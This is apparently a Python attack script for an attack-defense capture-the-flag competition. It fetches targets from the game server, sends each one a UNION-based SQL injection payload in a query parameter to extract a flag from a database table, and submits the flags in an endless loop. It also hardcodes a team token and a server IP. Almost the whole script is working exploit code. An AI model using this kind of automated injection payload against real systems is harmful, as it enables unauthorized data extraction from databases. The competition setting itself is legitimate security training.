
#!/usr/bin/python

# assume the PCTF will depend on the swpag_client package: https://pypi.org/project/swpag-client/

from swpag_client import Team
import time
import json
import re
from pwn import *
import requests


class PCTFAPI():

    __slots__ = ('team')

    def __init__(self, game_url, team_token):
        self.team = Team(game_url, team_token)

    def getServiceNames(self):

        service_ids = []
        services = self.team.get_service_list()

        for service in services:
            service_ids.append(service['service_id'])

        return service_ids

    def getTargets(self, service):
        targets = self.team.get_targets(service)
        return targets

    def getFLG(self, hostname, flagID):
        kid_url = 'http://' + hostname + ':10003/kid'

        print('Send request to: ' + kid_url)
        sql_injection = "%' UNION SELECT description AS data from parties where id=" + flagID + "; --"
        payload = {'first': 'Hong', 'last': sql_injection, 'age': 30}
        try:
            r = requests.get(kid_url, params=payload)
            res = r.text
            kid_id = res.split()[2]
            print(res)
            print(kid_id)

            find_url = 'http://' + hostname + ':10003/find'
            print('Send request to: ' + find_url)
            find_params = {'kid': kid_id}
            find_r = requests.get(find_url, params=find_params)
            find_res = find_r.text
            flag = find_res.split()[5]
            print(find_res)
            print(flag)
            return flag
        except:
            return None

    def submitFlag(self, flags):
        if not isinstance(flags, list):
            flags = [flags]

        status = self.team.submit_flag(flags)

        for i, s in enumerate(status):
            print("Flag %s submission status: %s" % (flags[i], s))

        return status


if __name__ == '__main__':

    # input our team's token
    team_token = "WOfdkzdhsZEIlPEIai49"

    # This may change between CTFs
    game_url = "http://34.211.129.130"

    # Initialize PCTFAPI
    api = PCTFAPI(game_url, team_token)

    # Get all service names
    service_names = api.getServiceNames()

    # Get all targets for each service
    while True:
        for service in service_names:
            if service == 3:
                targets = api.getTargets(service)

                for target in targets:
                    # TODO: implement some exploits to the target
                    message = 'waiting for some exploits'
                    message_1 = 'Submit test flag for service: ' + str(service) + ' and target: ' + json.dumps(target)
                    print(message)
                    print(message_1)
                    flag = api.getFLG(target.get("hostname"),
                                      target.get("flag_id"))
                    if flag != None:
                        api.submitFlag(flag)

        # search flag every 3 minutes. Need to be adjusted during the game
        time.sleep(60)

